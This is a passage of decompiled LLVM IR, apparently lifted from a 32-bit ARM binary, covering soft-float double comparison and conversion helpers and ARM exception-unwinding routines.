  store i32 %v5_172a8, i32* @r5, align 4
  %v4_172ac = icmp eq i32 %v2_172b0, %v0_172ac
  br i1 %v4_172ac, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_172a8
  %v5_172b0 = icmp eq i32 %v5_172a8, %v2_172b0
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_172a8, %bb109
  %v0_172b4 = phi i1 [ false, %dec_label_pc_172a8 ], [ %v5_172b0, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_172b4, i32 ptrtoint (i32* @global_var_170fc.595 to i32))
  %v0_172b8 = load i32, i32* @r4, align 4
  %v1_172b8 = load i32, i32* %ip.global-to-local, align 4
  %v4_172b8 = icmp eq i32 %v1_172b8, %v0_172b8
  br i1 %v4_172b8, label %dec_label_pc_172c0, label %dec_label_pc_172dc

dec_label_pc_172c0:                               ; preds = %bb110
  %v0_172c0 = load i32, i32* @r0, align 4
  %v1_172c0 = load i32, i32* @r1, align 4
  %v4_172c0 = mul i32 %v1_172c0, 4096
  %v5_172c0 = or i32 %v4_172c0, %v0_172c0
  store i32 %v5_172c0, i32* %r4.global-to-local, align 4
  %v1_172c4 = icmp ne i32 %v5_172c0, 0
  call void @__pseudo_cond_branch(i1 %v1_172c4, i32 ptrtoint (i32* @global_var_170fc.595 to i32))
  %v0_172c8 = load i32, i32* @r5, align 4
  %v1_172c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_172cc = icmp ne i32 %v1_172c8, %v0_172c8
  call void @__pseudo_cond_branch(i1 %v1_172cc, i32 ptrtoint (i32* @global_var_170e0.596 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_172d8 = call i32 @function_170fc(i32 %arg3, i32 %arg4)
  store i32 %v2_172d8, i32* @r0, align 4
  %v1_172dc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_172dc

dec_label_pc_172dc:                               ; preds = %bb110, %dec_label_pc_172c0
  %v1_172dc = phi i32 [ %v1_172b8, %bb110 ], [ %v1_172dc.pre, %dec_label_pc_172c0 ]
  %v0_172dc = load i32, i32* @r5, align 4
  %v4_172dc = icmp eq i32 %v0_172dc, %v1_172dc
  br i1 %v4_172dc, label %dec_label_pc_172e4, label %dec_label_pc_172dc.dec_label_pc_172f8_crit_edge

dec_label_pc_172dc.dec_label_pc_172f8_crit_edge:  ; preds = %dec_label_pc_172dc
  %v0_172f8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_172f8

dec_label_pc_172e4:                               ; preds = %dec_label_pc_172dc
  %v4_172e4 = mul i32 %arg4, 4096
  %v5_172e4 = or i32 %v4_172e4, %arg3
  store i32 %v5_172e4, i32* %r5.global-to-local, align 4
  %v7_172e4 = icmp eq i32 %v5_172e4, 0
  call void @__pseudo_cond_branch(i1 %v7_172e4, i32 ptrtoint (i32* @global_var_17090.597 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_172f4 = call i32 @function_170fc(i32 %arg3, i32 %arg4)
  store i32 %v2_172f4, i32* @r0, align 4
  br label %dec_label_pc_172f8

dec_label_pc_172f8:                               ; preds = %dec_label_pc_172dc.dec_label_pc_172f8_crit_edge, %dec_label_pc_172e4
  %v0_172f8 = phi i32 [ %v0_172f8.pre, %dec_label_pc_172dc.dec_label_pc_172f8_crit_edge ], [ %v2_172f4, %dec_label_pc_172e4 ]
  %v1_172f8 = load i32, i32* @r1, align 4
  %v3_172f8 = mul i32 %v1_172f8, 2
  %v4_172f8 = or i32 %v3_172f8, %v0_172f8
  store i32 %v4_172f8, i32* %r6.global-to-local, align 4
  %v6_172f8 = icmp eq i32 %v4_172f8, 0
  br i1 %v6_172f8, label %dec_label_pc_172f8._crit_edge, label %bb111

dec_label_pc_172f8._crit_edge:                    ; preds = %dec_label_pc_172f8
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_172f8
  %v4_172fc = mul i32 %arg4, 2
  %v5_172fc = or i32 %v4_172fc, %arg3
  store i32 %v5_172fc, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_172fc, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_172f8._crit_edge, %bb111
  %v4_1730c.pre-phi = phi i32 [ %.pre80, %dec_label_pc_172f8._crit_edge ], [ %v5_172fc, %bb111 ]
  %v0_17300 = phi i1 [ false, %dec_label_pc_172f8._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_17300, i32 ptrtoint (i32* @global_var_17028.598 to i32))
  %v0_17304 = load i32, i32* @r0, align 4
  %v1_17304 = load i32, i32* @r1, align 4
  %v3_17304 = mul i32 %v1_17304, 2
  %v4_17304 = or i32 %v3_17304, %v0_17304
  store i32 %v4_17304, i32* %r4.global-to-local, align 4
  %v1_17308 = icmp ne i32 %v4_17304, 0
  call void @__pseudo_cond_branch(i1 %v1_17308, i32 ptrtoint (i32* @global_var_170e0.596 to i32))
  store i32 %v4_1730c.pre-phi, i32* %r5.global-to-local, align 4
  %v1_17310 = icmp ne i32 %v4_1730c.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_17310, i32 ptrtoint (i32* @global_var_17090.597 to i32))
  %v0_17314 = load i32, i32* @r0, align 4
  %v1_17314 = load i32, i32* @r1, align 4
  %v2_17314 = call i32 @function_170fc(i32 %v0_17314, i32 %v1_17314)
  store i32 %v2_17314, i32* %r0.global-to-local, align 4
  ret i32 %v2_17314

; uselistorder directives
  uselistorder i32 %v5_172fc, { 1, 0, 2 }
  uselistorder i32 %v1_172b8, { 1, 0 }
  uselistorder i32 %v1_17298, { 1, 0 }
  uselistorder i32 %v0_17298, { 3, 1, 0, 2 }
  uselistorder i32 %v10_17280, { 2, 0, 1 }
  uselistorder i32 %v6_1727c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_17274, { 1, 0 }
  uselistorder i32 %v2_1725c, { 1, 0, 2 }
  uselistorder i32 %v1_1725c, { 1, 0, 2 }
  uselistorder i32 %v1_17258, { 1, 0, 2 }
  uselistorder i32 %v0_17258, { 1, 0, 2 }
  uselistorder i1 %v7_1724c, { 1, 0 }
  uselistorder i32 %v2_17230, { 1, 0 }
  uselistorder i32 %v3_1721c, { 2, 1, 0 }
  uselistorder i32 %v3_17210, { 0, 2, 1 }
  uselistorder i32 %v5_1720c, { 2, 0, 1 }
  uselistorder i32 %v6_171fc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_171e8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_171e4, { 3, 0, 2, 1 }
  uselistorder i32 %v0_171f0, { 0, 2, 1 }
  uselistorder i32 %v1_171fc, { 1, 0 }
  uselistorder i32 %v6_171e0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_171cc, { 1, 2, 0, 3 }
  uselistorder i32 %v3_171c8, { 0, 2, 1 }
  uselistorder i32 %v0_171d4, { 0, 2, 1 }
  uselistorder i32 %v1_171e0, { 1, 0 }
  uselistorder i32 %v6_171c4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_171b0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_171b8, { 0, 2, 1 }
  uselistorder i32 %v1_171c4, { 1, 0 }
  uselistorder i32 %v3_171a8, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1719c, { 1, 2, 0 }
  uselistorder i32 %v3_1721c13, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1721817, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1719c, { 0, 3, 2, 1 }
  uselistorder i32 %v1_171a8, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_17244.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_17188, { 1, 0 }
  uselistorder i32 %v0_1718c, { 1, 0 }
  uselistorder i32 %v3_17178, { 1, 0 }
  uselistorder i1 %v1_1716c, { 1, 0 }
  uselistorder i32 %v3_1715c, { 2, 3, 1, 0 }
  uselistorder i32 %v5_17158, { 3, 2, 1, 0 }
  uselistorder i32 %v3_17150, { 2, 1, 0 }
  uselistorder i32 %v5_1714c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1712c, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_1711c, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1711c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_17118, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_17118, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1710c, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 9, 10, 2, 3, 6, 4, 5, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 9, 0, 6, 7, 1, 2, 3, 4, 5, 8 }
  uselistorder i32* %ip.global-to-local, { 8, 5, 6, 7, 0, 1, 2, 3, 4, 10, 9 }
  uselistorder i32 (i32, i32)* @function_170fc, { 2, 1, 0 }
  uselistorder i32 ()* @function_16f68, { 1, 0 }
  uselistorder i32 1024, { 3, 0, 5, 6, 4, 7, 2, 8, 9, 10, 1 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 33, { 2, 3, 4, 1, 5, 6, 7, 0 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 1048576, { 21, 0, 1, 2, 22, 23, 14, 3, 4, 5, 24, 6, 7, 25, 26, 17, 18, 8, 9, 27, 28, 29, 20, 30, 10, 15, 11, 19, 12, 31, 13, 16, 32 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_172f8, { 1, 0 }
  uselistorder label %dec_label_pc_172dc, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_172a8, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_17198, { 1, 0 }
  uselistorder label %dec_label_pc_17180, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1731c = call i32 @function_1732c()
  ret i32 %v0_1731c
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_17324 = call i32 @function_1732c()
  ret i32 %v0_17324

; uselistorder directives
  uselistorder i32 ()* @function_1732c, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_17328 = load i32, i32* @r0, align 4
  ret i32 %v0_17328
}

define i32 @function_1732c() local_unnamed_addr {
dec_label_pc_1732c:
  %v0_1732c = load i32, i32* @ip, align 4
  %v0_17330 = load i32, i32* @r1, align 4
  %v2_17330 = mul i32 %v0_17330, 2
  %v2_17330.off = add i32 %v2_17330, 4194303
  %tmp = icmp ult i32 %v2_17330.off, 2097152
  %v0_17338 = load i32, i32* @r3, align 4
  %v2_17338 = mul i32 %v0_17338, 2
  br i1 %tmp, label %dec_label_pc_17388, label %bb

bb:                                               ; preds = %dec_label_pc_1732c
  %v2_17338.off = add i32 %v2_17338, 4194303
  %tmp21 = icmp ult i32 %v2_17338.off, 2097152
  br i1 %tmp21, label %dec_label_pc_1737c, label %dec_label_pc_17344

dec_label_pc_17344:                               ; preds = %dec_label_pc_17390, %dec_label_pc_1739c, %bb
  %v0_17344 = load i32, i32* @r0, align 4
  %v4_17344 = or i32 %v0_17344, %v2_17330
  %v6_17344 = icmp eq i32 %v4_17344, 0
  br i1 %v6_17344, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_17344
  %v1_17348 = load i32, i32* @r2, align 4
  %v5_17348 = or i32 %v1_17348, %v2_17338
  %v7_17348 = icmp eq i32 %v5_17348, 0
  br i1 %v7_17348, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_17344, %bb10
  %v5_1734c = icmp eq i32 %v0_17338, %v0_17330
  br i1 %v5_1734c, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_17350.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_17350 = phi i32 [ %v2_17350.pre, %.thread..thread1_crit_edge ], [ %v1_17348, %bb10 ]
  %v5_17350 = icmp eq i32 %v2_17350, %v0_17344
  br i1 %v5_17350, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_17358 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_17358 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_17358, i32 %v0_17358)
  %v0_1735c = load i32, i32* @r0, align 4
  %v0_17360 = load i32, i32* @r1, align 4
  %v1_17360 = load i32, i32* @r3, align 4
  %v2_17360 = xor i32 %v1_17360, %v0_17360
  %v3_17360 = icmp slt i32 %v2_17360, 0
  br i1 %v3_17360, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_17364 = icmp eq i32 %v0_17360, %v1_17360
  br i1 %v10_17364, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_17368 = load i32, i32* @r2, align 4
  %v4_17368 = icmp ult i32 %v0_1735c, %v2_17368
  br i1 %v4_17368, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_17364 = icmp ult i32 %v0_17360, %v1_17360
  br i1 %v4_17364, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_17360, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_1736c = and i32 %v1_17360, 1073741824
  %v3_1736c = icmp eq i32 %v2_1736c, 0
  %v4_1736c = ashr i32 %v1_17360, 31
  br i1 %v3_1736c, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_17370.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_1736c, %bb15 ]
  %v5_17370 = sub nsw i32 -1, %v4_17370.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_17374 = phi i32 [ %v4_1736c, %bb15 ], [ %v5_17370, %.thread3 ]
  %v1_17374 = or i32 %v0_17374, 1
  ret i32 %v1_17374

dec_label_pc_1737c:                               ; preds = %bb
  br label %dec_label_pc_17390

dec_label_pc_17388:                               ; preds = %dec_label_pc_1732c
  %v0_17388 = load i32, i32* @r0, align 4
  %v4_17388 = mul i32 %v0_17330, 4096
  %v5_17388 = or i32 %v0_17388, %v4_17388
  %v7_17388 = icmp eq i32 %v5_17388, 0
  br i1 %v7_17388, label %dec_label_pc_17388.dec_label_pc_17390_crit_edge, label %dec_label_pc_173a4

dec_label_pc_17388.dec_label_pc_17390_crit_edge:  ; preds = %dec_label_pc_17388
  %v2_17338.off20 = add i32 %v2_17338, 4194303
  %tmp22 = icmp ult i32 %v2_17338.off20, 2097152
  br label %dec_label_pc_17390

dec_label_pc_17390:                               ; preds = %dec_label_pc_17388.dec_label_pc_17390_crit_edge, %dec_label_pc_1737c
  %v3_17394.pre-phi = phi i1 [ %tmp22, %dec_label_pc_17388.dec_label_pc_17390_crit_edge ], [ true, %dec_label_pc_1737c ]
  br i1 %v3_17394.pre-phi, label %dec_label_pc_1739c, label %dec_label_pc_17344

dec_label_pc_1739c:                               ; preds = %dec_label_pc_17390
  %v0_1739c = load i32, i32* @r2, align 4
  %v4_1739c = mul i32 %v0_17338, 4096
  %v5_1739c = or i32 %v0_1739c, %v4_1739c
  %v7_1739c = icmp eq i32 %v5_1739c, 0
  br i1 %v7_1739c, label %dec_label_pc_17344, label %dec_label_pc_173a4

dec_label_pc_173a4:                               ; preds = %dec_label_pc_17388, %dec_label_pc_1739c
  ret i32 %v0_1732c

; uselistorder directives
  uselistorder i32 %v4_1736c, { 1, 0 }
  uselistorder i32 %v1_17360, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_17360, { 2, 1, 0 }
  uselistorder i32 %v1_17348, { 1, 0 }
  uselistorder i32 %v2_17338, { 0, 2, 1 }
  uselistorder i32 %v0_17338, { 1, 0, 2 }
  uselistorder i32 %v2_17330, { 1, 0 }
  uselistorder i32 %v0_17330, { 1, 0, 2 }
  uselistorder i32 31, { 9, 4, 2, 5, 6, 10, 3, 19, 11, 1, 12, 13, 14, 15, 16, 17, 7, 8, 0, 18 }
  uselistorder label %dec_label_pc_173a4, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_17344, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_173ac = load i32, i32* @r0, align 4
  %v0_173b0 = load i32, i32* @r2, align 4
  store i32 %v0_173b0, i32* @r0, align 4
  store i32 %v0_173ac, i32* @r2, align 4
  %v0_173c4 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_173c4
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_173c8 = load i32, i32* @r0, align 4
  %v1_173cc = sext i32 %v3_173c8 to i64
  %v2_173cc = bitcast i64 %v1_173cc to double
  %v3_173cc = load i32, i32* @r2, align 4
  %v4_173cc = sext i32 %v3_173cc to i64
  %v5_173cc = bitcast i64 %v4_173cc to double
  %v7_173cc = fcmp oeq double %v2_173cc, %v5_173cc
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_173cc = fcmp ule double %v2_173cc, %v5_173cc
  %not.v7_173cc = xor i1 %v7_173cc, true
  %v1_173d0 = and i1 %not.v6_173cc, %not.v7_173cc
  store i1 %v7_173cc, i1* @cpsr_z, align 1
  br i1 %v1_173d0, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_173cc, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_173c8

; uselistorder directives
  uselistorder i1 %v7_173cc, { 1, 2, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_173e4 = call i32 @__aeabi_cdcmple()
  %v0_173e8 = load i1, i1* @cpsr_z, align 1
  %.v0_173e4. = zext i1 %v0_173e8 to i32
  ret i32 %.v0_173e4.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_173fc = call i32 @__aeabi_cdcmple()
  %v0_17400 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_17400 to i32
  %.v0_173fc. = xor i32 %tmp2, 1
  ret i32 %.v0_173fc.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_17414 = call i32 @__aeabi_cdcmple()
  %v0_17418 = load i1, i1* @cpsr_z, align 1
  %v1_17418 = load i1, i1* @cpsr_c, align 1
  %v2_17418 = xor i1 %v1_17418, true
  %v3_17418 = or i1 %v0_17418, %v2_17418
  %.v0_17414 = select i1 %v3_17418, i32 1, i32 %v0_17414
  %v2_1741c = xor i1 %v0_17418, true
  %v3_1741c = and i1 %v1_17418, %v2_1741c
  %..v0_17414 = select i1 %v3_1741c, i32 0, i32 %.v0_17414
  ret i32 %..v0_17414

; uselistorder directives
  uselistorder i1 %v1_17418, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_17428 = load i32, i32* @lr, align 4
  store i32 %v0_17428, i32* %stack_var_-8, align 4
  %v0_1742c = call i32 @__aeabi_cdrcmple()
  %v0_17430 = load i1, i1* @cpsr_z, align 1
  %v1_17430 = load i1, i1* @cpsr_c, align 1
  %v2_17430 = xor i1 %v1_17430, true
  %v3_17430 = or i1 %v0_17430, %v2_17430
  %.v0_1742c = select i1 %v3_17430, i32 1, i32 %v0_1742c
  %v2_17434 = xor i1 %v0_17430, true
  %v3_17434 = and i1 %v1_17430, %v2_17434
  %..v0_1742c = select i1 %v3_17434, i32 0, i32 %.v0_1742c
  %v2_17438 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17438, i32* @lr, align 4
  ret i32 %..v0_1742c

; uselistorder directives
  uselistorder i1 %v1_17430, { 1, 0 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_17444 = call i32 @__aeabi_cdrcmple()
  %v0_17448 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_17448 to i32
  %.v0_17444. = xor i32 %tmp2, 1
  ret i32 %.v0_17444.

; uselistorder directives
  uselistorder i1* @cpsr_c, { 0, 3, 1, 4, 5, 6, 2, 7, 8, 9 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_17458 = icmp slt i32 %arg2, 0
  %v2_17458 = mul i32 %arg2, 2
  br i1 %v1_17458, label %dec_label_pc_1748c, label %dec_label_pc_17460

dec_label_pc_17460:                               ; preds = %entry
  %v1_17460 = add i32 %v2_17458, 2097152
  %v2_17460 = icmp ugt i32 %v2_17458, -2097153
  br i1 %v2_17460, label %dec_label_pc_17494, label %dec_label_pc_17468

dec_label_pc_17468:                               ; preds = %dec_label_pc_17460
  %v6_17460 = icmp slt i32 %v1_17460, 0
  br i1 %v6_17460, label %dec_label_pc_1746c, label %dec_label_pc_1748c

dec_label_pc_1746c:                               ; preds = %dec_label_pc_17468
  %v4_17470 = sdiv i32 %v1_17460, 2097152
  %v5_17470 = sub nsw i32 -993, %v4_17470
  %v11_17470 = icmp slt i32 %v5_17470, 0
  br i1 %v11_17470, label %dec_label_pc_1749c, label %dec_label_pc_17478

dec_label_pc_17478:                               ; preds = %dec_label_pc_1746c
  %v3_17478 = mul i32 %arg2, 2048
  %v4_17480 = udiv i32 %arg1, 2097152
  %v1_1747c = or i32 %v4_17480, %v3_17478
  %v5_17480 = or i32 %v1_1747c, -2147483648
  %v6_17484 = lshr i32 %v5_17480, %v5_17470
  ret i32 %v6_17484

dec_label_pc_1748c:                               ; preds = %dec_label_pc_17468, %entry
  ret i32 0

dec_label_pc_17494:                               ; preds = %dec_label_pc_17460
  %v4_17494 = mul i32 %arg2, 4096
  %v5_17494 = or i32 %v4_17494, %arg1
  %v7_17494 = icmp eq i32 %v5_17494, 0
  br i1 %v7_17494, label %dec_label_pc_1749c, label %dec_label_pc_174a4

dec_label_pc_1749c:                               ; preds = %dec_label_pc_17494, %dec_label_pc_1746c
  ret i32 -1

dec_label_pc_174a4:                               ; preds = %dec_label_pc_17494
  ret i32 0

; uselistorder directives
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_174ac = icmp eq i32 %regclass, 0
  br i1 %v2_174ac, label %dec_label_pc_174b4, label %dec_label_pc_174e4

dec_label_pc_174b4:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_174b4
  %v6_174b8 = icmp eq i32 %representation, 0
  br i1 %v6_174b8, label %dec_label_pc_174c8, label %bb8

.thread3:                                         ; preds = %dec_label_pc_174b4
  br label %dec_label_pc_174f0

bb8:                                              ; preds = %bb
  br label %dec_label_pc_174f0

dec_label_pc_174c8:                               ; preds = %bb
  %v3_174c8 = mul i32 %regno, 4
  %v2_174cc = add i32 %v3_174c8, %context
  %v1_174d0 = add i32 %v2_174cc, 4
  %v2_174d0 = inttoptr i32 %v1_174d0 to i32*
  %v3_174d0 = load i32, i32* %v2_174d0, align 4
  %v2_174dc = bitcast i8* %valuep to i32*
  store i32 %v3_174d0, i32* %v2_174dc, align 4
  ret i32 0

dec_label_pc_174e4:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_174e4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_174e4, %bb9
  %v0_174ec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_174ec)
  br label %dec_label_pc_174f0

dec_label_pc_174f0:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_174f0, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_174f8 = icmp eq i32 %regclass, 0
  br i1 %v2_174f8, label %dec_label_pc_17500, label %dec_label_pc_17530

dec_label_pc_17500:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17500
  %v6_17504 = icmp eq i32 %representation, 0
  br i1 %v6_17504, label %dec_label_pc_17514, label %bb8

.thread3:                                         ; preds = %dec_label_pc_17500
  br label %dec_label_pc_1753c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_1753c

dec_label_pc_17514:                               ; preds = %bb
  %v3_17518 = mul i32 %regno, 4
  %v1_1751c = bitcast i8* %valuep to i32*
  %v2_1751c = load i32, i32* %v1_1751c, align 4
  %v2_17520 = add i32 %v3_17518, %context
  %v2_17528 = add i32 %v2_17520, 4
  %v3_17528 = inttoptr i32 %v2_17528 to i32*
  store i32 %v2_1751c, i32* %v3_17528, align 4
  ret i32 0

dec_label_pc_17530:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17530
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17530, %bb9
  %v0_17538 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_17538)
  br label %dec_label_pc_1753c

dec_label_pc_1753c:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_1753c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_17544 = add i32 %context, 68
  %v2_17544 = inttoptr i32 %v1_17544 to i32*
  %v3_17544 = load i32, i32* %v2_17544, align 4
  ret i32 %v3_17544

; uselistorder directives
  uselistorder i32 68, { 32, 0, 30, 1, 2, 3, 4, 31, 6, 10, 7, 11, 8, 12, 9, 13, 21, 22, 20, 23, 24, 25, 26, 27, 28, 15, 16, 17, 18, 14, 19, 5, 29 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_17554 = add i32 %exc, 8
  %v2_17554 = inttoptr i32 %v1_17554 to i32*
  %v3_17554 = load i32, i32* %v2_17554, align 4
  %v2_17558 = icmp eq i32 %v3_17554, 0
  br i1 %v2_17558, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_1756c = xor i1 %v2_17558, true
  call void @__pseudo_cond_branch(i1 %v2_1756c, i32 %v3_17554)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
